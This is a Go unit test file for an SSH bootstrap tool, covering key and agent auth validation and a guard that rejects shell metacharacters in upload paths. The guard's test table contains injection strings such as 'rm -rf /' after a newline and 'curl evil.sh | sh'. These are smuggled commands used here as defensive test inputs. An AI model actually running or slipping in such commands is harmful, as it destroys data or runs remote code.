package tools

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/pem"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"golang.org/x/crypto/ssh"
)

// White-box unit tests for the unexported add_server bootstrap helpers.
// They cover the SEAM-FREE pre-dial guards (auth-method resolution,
// known_hosts requirement, uploadFile metachar guard). The full bootstrap
// flow (dial + upload + rollback) is covered separately in
// add_server_bootstrap_test.go via the newBootstrapSession seam.

// writeTestPrivKey writes a fresh, valid OpenSSH ed25519 private key to
// dir/name with the given mode and returns its path. Used to exercise the
// bootstrapAuthMethod key-file branch without touching the real ~/.ssh.
func writeTestPrivKey(t *testing.T, dir, name string, mode os.FileMode) string {
	t.Helper()
	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("generate key: %v", err)
	}
	block, err := ssh.MarshalPrivateKey(priv, "")
	if err != nil {
		t.Fatalf("marshal private key: %v", err)
	}
	pemBytes := pem.EncodeToMemory(block)
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, pemBytes, mode); err != nil {
		t.Fatalf("write key: %v", err)
	}
	// os.WriteFile honours umask; force the exact mode we asked for.
	if err := os.Chmod(path, mode); err != nil {
		t.Fatalf("chmod key: %v", err)
	}
	return path
}

// TestUploadFile_RemotePathMetacharGuard asserts that uploadFile rejects a
// remotePath containing any shell metacharacter BEFORE it opens a session
// (so a nil client never gets dereferenced). The legitimate package
// constants (which begin with "~/.sshgate-gate/...") are intentionally NOT
// run through this table because they would proceed to NewSession.
func TestUploadFile_RemotePathMetacharGuard(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		path string
	}{
		{"space", "~/.sshgate-gate/a b"},
		{"tab", "~/.sshgate-gate/a\tb"},
		{"newline", "~/.sshgate-gate/a\nrm -rf /"},
		{"carriage return", "~/.sshgate-gate/a\rb"},
		{"nul", "~/.sshgate-gate/a\x00b"},
		{"double quote", "~/.sshgate-gate/\"x\""},
		{"single quote", "~/.sshgate-gate/'x'"},
		{"backslash", "~/.sshgate-gate/a\\b"},
		{"dollar", "~/.sshgate-gate/$HOME"},
		{"backtick", "~/.sshgate-gate/`id`"},
		{"pipe", "~/.sshgate-gate/a|b"},
		{"ampersand", "~/.sshgate-gate/a&b"},
		{"semicolon", "~/.sshgate-gate/a;b"},
		{"redirect in", "~/.sshgate-gate/a<b"},
		{"redirect out", "~/.sshgate-gate/a>b"},
		{"open paren", "~/.sshgate-gate/a(b"},
		{"close paren", "~/.sshgate-gate/a)b"},
		{"open brace", "~/.sshgate-gate/a{b"},
		{"close brace", "~/.sshgate-gate/a}b"},
		{"star glob", "~/.sshgate-gate/*"},
		{"question glob", "~/.sshgate-gate/a?b"},
		{"open bracket", "~/.sshgate-gate/a[b"},
		{"close bracket", "~/.sshgate-gate/a]b"},
		{"bang", "~/.sshgate-gate/a!b"},
		{"hash", "~/.sshgate-gate/a#b"},
		{"command substitution attempt", "~/.sshgate-gate/x; curl evil.sh | sh"},
	}
	for _, c := range cases {
		c := c
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			// A nil client is safe: the guard returns before NewSession.
			err := uploadFile(context.Background(), nil, []byte("body"), c.path, "644")
			if err == nil {
				t.Fatalf("uploadFile(%q) = nil; want shell-metachar rejection", c.path)
			}
			if !strings.Contains(err.Error(), "shell metacharacters") {
				t.Errorf("uploadFile(%q) err = %v; want shell-metacharacter rejection", c.path, err)
			}
		})
	}
}

// TestBootstrapAuthMethod covers the validation surface of the
// bootstrap-credential resolver (shared with Provision): agent path with
// empty $SSH_AUTH_SOCK, key-file path with a missing file, and key-file path
// with an insecure (group/other-readable) mode. The agent-present and
// key-valid happy paths are exercised via the seam tests in
// add_server_bootstrap_test.go, so they are not duplicated here.
func TestBootstrapAuthMethod_EmptyAgentSocket(t *testing.T) {
	// Not t.Parallel: mutates the process-wide SSH_AUTH_SOCK env var.
	t.Setenv("SSH_AUTH_SOCK", "")
	_, err := bootstrapAuthMethod(AddServerInput{BootstrapAgent: true})
	if err == nil {
		t.Fatal("bootstrapAuthMethod(agent, empty SSH_AUTH_SOCK) = nil; want error")
	}
	if !strings.Contains(err.Error(), "SSH_AUTH_SOCK") {
		t.Errorf("err = %v; want mention of empty $SSH_AUTH_SOCK", err)
	}
}

func TestBootstrapAuthMethod_MissingKeyFile(t *testing.T) {
	t.Parallel()
	missing := filepath.Join(t.TempDir(), "does-not-exist")
	_, err := bootstrapAuthMethod(AddServerInput{BootstrapKeyPath: missing})
	if err == nil {
		t.Fatal("bootstrapAuthMethod(missing key) = nil; want error")
	}
	if !strings.Contains(err.Error(), "does not exist") {
		t.Errorf("err = %v; want a 'does not exist' message", err)
	}
}

func TestBootstrapAuthMethod_InsecureKeyMode(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	// 0644 is group/other readable — must be rejected (0o077 bits set).
	keyPath := writeTestPrivKey(t, dir, "id_ed25519", 0o644)
	_, err := bootstrapAuthMethod(AddServerInput{BootstrapKeyPath: keyPath})
	if err == nil {
		t.Fatal("bootstrapAuthMethod(0644 key) = nil; want insecure-mode rejection")
	}
	if !strings.Contains(err.Error(), "insecure mode") {
		t.Errorf("err = %v; want an 'insecure mode' rejection", err)
	}
}

// TestBootstrapAuthMethod_ValidKeyAccepted is the happy-path control: a
// 0600 key parses into a PublicKeys auth method with no error. This proves
// the insecure-mode test above fails for the mode, not the key contents.
func TestBootstrapAuthMethod_ValidKeyAccepted(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	keyPath := writeTestPrivKey(t, dir, "id_ed25519", 0o600)
	auth, err := bootstrapAuthMethod(AddServerInput{BootstrapKeyPath: keyPath})
	if err != nil {
		t.Fatalf("bootstrapAuthMethod(0600 valid key) = %v; want nil", err)
	}
	if auth == nil {
		t.Fatal("bootstrapAuthMethod returned a nil AuthMethod for a valid key")
	}
}
